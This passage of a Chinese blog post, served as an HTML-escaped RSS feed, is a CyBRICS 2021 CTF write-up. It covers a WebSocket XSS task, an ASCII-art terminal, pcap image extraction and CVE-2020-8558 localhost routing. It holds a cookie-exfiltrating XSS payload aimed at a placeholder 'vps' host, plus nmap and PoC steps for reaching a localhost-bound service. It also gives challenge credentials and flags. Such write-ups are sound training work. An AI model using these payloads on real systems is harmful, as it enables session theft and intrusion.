&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2000&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者非预期解：在url部分进行xss，payload: &lt;code>javascript:location.href='http://vps/?cookie='+document.cookie&lt;/code>（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png" alt="image-20210729144122926">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png" alt="image-20210729143946243">&lt;/p>
&lt;p>参考：&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> | &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocket安全问题分析&lt;/a> &lt;a href="https://segmentfault.com/a/1190000014582485">WebSocket断开原因分析&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">使用 Fetch&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> | &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborator模块详解&lt;/a> | &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>（列入待完成计划&lt;/p>
&lt;h2 id="ascii-terminal-network-baby-116-pts">ASCII Terminal (Network, Baby, 116 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Artur Khanov (&lt;a href="https://t.me/awengar">@awengar&lt;/a>)&lt;/p>
&lt;p>At &lt;code>138.68.83.253:3333&lt;/code> you have an ASCII terminal. It really works, check with the &lt;a href="https://cybrics.net/files/id.txt">&lt;strong>id command&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>nc连上以后可以看到一个bash $，题目的提示是&amp;quot;ASCII termial&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png" alt="image-20210728231402633">&lt;/p>
&lt;p>把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具&lt;/p>
&lt;p>toilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png" alt="image-20210728234413850">&lt;/p>
&lt;p>可以玩出很多花样~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
&lt;p>书归正题，这里使用&lt;code>toilet -f bigascii9 +command&lt;/code>的命令生成结果，将空格换为 &lt;code>.&lt;/code>再发送即可&lt;/p>
&lt;pre>&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
&lt;/code>&lt;/pre>&lt;p>（值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的&lt;code>%s/\s/./g&lt;/code>命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png" alt="image-20210729002105318">&lt;/p>
&lt;p>最后flag：cybrics{T3553R4C7_15_GOOD}&lt;/p>
&lt;p>————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到&lt;a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&amp;amp;t=2605s">录播视频&lt;/a>中看&lt;/p>
&lt;p>参考：&lt;a href="https://www.shuzhiduo.com/A/RnJW9QLBdq/">调皮捣蛋的Linux下有趣终端的合集&lt;/a> | &lt;a href="https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal">Linux Fun - 如何在终端中创建ASCII文本横幅&lt;/a> | &lt;a href="https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/">Neofetch - 显示具有分发标志的Linux系统信息&lt;/a>&lt;/p>
&lt;h2 id="lx-100-network-easy-192-pts">LX-100 (Network, Easy, 192 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.&lt;/p>
&lt;p>Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.&lt;/p>
&lt;p>&lt;a href="https://cybrics.net/files/lx100.pcap">&lt;strong>lx100.pcap&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>（说实话，pacp包是真的不会看TAT&lt;/p>
&lt;p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
（以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">官方视频中&lt;/a>确实这样可以成功 emmmm&lt;/p>
&lt;pre>&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
php -a
foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
&lt;/code>&lt;/pre>&lt;p>（以下是在&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">别的wp&lt;/a>中看到的py脚本： 可成功复现 导出455张jpg图&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>
&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FileCapture&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lx100.pcap&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;UDP&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;udp&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">srcport&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65415&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">udp_bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fromhex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ffd8ffdb&amp;#39;&lt;/span>&lt;span style="color:#111">):])&lt;/span>
&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;out_files/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_packet.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">udp_bytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg" alt="235_packet">&lt;/p>
&lt;p>&lt;del>放大 再放大 每一根&lt;/del> 最后的flag是 &lt;code>cybrics{Lost_Secrets_In_The_AIr}&lt;/code>&lt;/p>
&lt;h2 id="localhost-network-hard-267-pts">localhost (Network, Hard, 267 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
&lt;pre>&lt;code>ssh localhost@109.233.61.10
Password: ohx7eeQu
&lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
&lt;/blockquote>
&lt;p>先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png" alt="image-20210729122432345">&lt;/p>
&lt;p>自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段&lt;code>nmap -sS -Pn 10.193.10.7/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png" alt="image-20210729131318834">&lt;/p>
&lt;p>发现10.193.10.180的80端口开放，用curl访问&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
&lt;p>提示&lt;em>Flag-containing-Records&lt;/em> 接着访问两个超链接的内容&lt;/p>
&lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：&lt;/p>
&lt;pre>&lt;code>bind 127.0.0.1
protected-mod yes
port 6379
&lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>也是相关的配置文件 只有一句没被注释&lt;/p>
&lt;pre>&lt;code>net.ipv4.conf.all.route_localnet=1
&lt;/code>&lt;/pre>&lt;p>查google，发现了这些：&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
&lt;p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：&lt;/p>
&lt;blockquote>
&lt;p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> sysctl setting. According to the kernel documentation, this setting makes the kernel &amp;ldquo;not consider loopback addresses as martian&amp;rdquo; &amp;ndash; a consequence of which is that they could be accessed by other nodes on the network. That&amp;rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!&lt;/p>
&lt;p>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> changes that &amp;ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.&lt;/p>
&lt;p>So, if an attacker has a local connection to a target node with &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.&lt;/p>
&lt;p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&amp;rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.&lt;/p>
&lt;/blockquote>
&lt;p>（不得不说ipv4当初把整个&lt;code>127.0.0.0/8&lt;/code>的地址都给了本地回环用真的是太慷慨了&amp;hellip;&amp;hellip; 到ipv6就只有一个&lt;code>:: 1&lt;/code>&lt;/p>
&lt;p>在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>tst-2020-8558.py&lt;/strong>
Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to &lt;code>127.0.0.1&lt;/code> via your target, and looks to see if there is a reply.&lt;/p>
&lt;p>&lt;strong>poc-2020-8558.py&lt;/strong>
Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
Because this script uses raw sockets to send and receive the &amp;ldquo;localhost&amp;rdquo; packets, it works fine inside a normal unprivileged container.&lt;/p>
&lt;/blockquote>
&lt;p>因为需要nc 所以另开一个shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png" alt="image-20210729153443403">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png" alt="image-20210729153501930">&lt;/p>
&lt;p>参考：&lt;a href="https://jan.show/?p=128">wp&lt;/a> | &lt;a href="https://www.zhihu.com/question/49866806">为什么整个127.*网段都被拿来当做环回地址了？&lt;/a>&lt;/p>
&lt;hr>
&lt;p>本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">此处是参考wp&lt;/a>&lt;/p>
&lt;p>道阻且长呀，暑假要好好努力咯 (つд⊂)
参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆&lt;/p></description></item></channel></rss>